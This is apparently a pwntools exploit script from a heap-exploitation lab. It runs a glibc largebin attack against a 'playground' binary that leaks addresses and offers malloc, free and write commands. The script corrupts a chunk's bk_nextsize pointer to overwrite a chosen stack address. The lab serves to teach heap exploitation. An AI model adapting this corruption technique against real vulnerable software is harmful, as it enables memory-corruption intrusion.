#!/usr/bin/env python3

import pwn
import sys

BIN_FILENAME = "/lab/bin/playground"

gdbscript = """
    set resolve-heap-via-heuristic force
    continue
"""


def exploit(p):
    # get leaks
    p.recvuntil(b"[*] stack ")
    stack_ptr = int(p.recvline()[:-1], 16)
    print(f"stack_ptr: {stack_ptr:#x}")
    p.recvuntil(b"[*] global ")
    data_ptr = int(p.recvline()[:-1], 16)
    print(f"data_ptr: {data_ptr:#x}")

    target = stack_ptr
    print(f"target to overwrite: {target:#x}")

    # first large chunk
    p.clean()
    p.sendline(b"malloc 0x428")
    p.recvuntil(b"[*]")
    ptr1 = int(p.recvline()[:-1], 16)
    print(f"ptr1: {ptr1:#x}")

    # to prevent consolidation
    p.sendline(b"malloc 0x10")

    # second large chunk, smaller than ptr1 but
    # in the same largebin bin
    p.clean()
    p.sendline(b"malloc 0x418")
    p.recvuntil(b"[*]")
    ptr2 = int(p.recvline()[:-1], 16)
    print(f"ptr2: {ptr2:#x}")

    # to prevent consolidation
    p.sendline(b"malloc 0x10")

    # free the larger one to unsortedbin
    p.sendline(f"free {ptr1:#x}".encode())

    # malloc a larger one to send ptr1 to largebin
    p.sendline(b"malloc 0x438")

    # free the smaller one
    p.sendline(f"free {ptr2:#x}".encode())
    # at this point, ptr1 will be in largebin,
    # ptr2 will be in unsortedbin

    # corrupt ptr1 chunk bk_nextsize = target-0x20
    p.sendline(f"write {ptr1 + 8*3:#x} 8".encode())
    p.send(pwn.p64(target - 0x20))

    # malloc something larger than ptr2
    p.sendline(b"malloc 0x438")

    input(f"done. {target:#x} in the stack was overwritten with value {ptr2 - 0x10:#x}")


def main():
    if "--gdb" in sys.argv:
        p = pwn.gdb.debug(
            BIN_FILENAME,
            env={},
            gdbscript=gdbscript
        )
    else:
        p = pwn.process(BIN_FILENAME, env={})

    exploit(p)
    p.interactive()


if __name__ == "__main__":
    main()
